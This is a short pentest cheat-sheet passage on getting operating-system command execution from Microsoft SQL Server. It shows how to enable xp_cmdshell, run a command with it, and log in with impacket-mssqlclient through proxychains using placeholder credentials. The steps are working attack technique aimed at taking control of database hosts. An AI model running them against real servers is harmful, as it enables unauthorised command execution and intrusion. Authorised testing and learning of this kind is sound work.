In MSSQL thanks to the keyword execute, we can execute arbitrary command on the operating system below. To do that first we have to enable command execution inside the Database with

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Then execute commands with

```sql
EXECUTE xp_cmdshell 'whoami'
```

Putting all togheter, we can have very fancy injections adding multiple tools.

### impacket-mssqlclient

We can use **impacket-mssqlclient** with **-windows-auth** as login method in the **MSSQL** Database

```shell
proxychains python3 /home/kali/.local/bin/mssqlclient.py -port 1433 domain.com/user:password@<IP> -windows-auth
```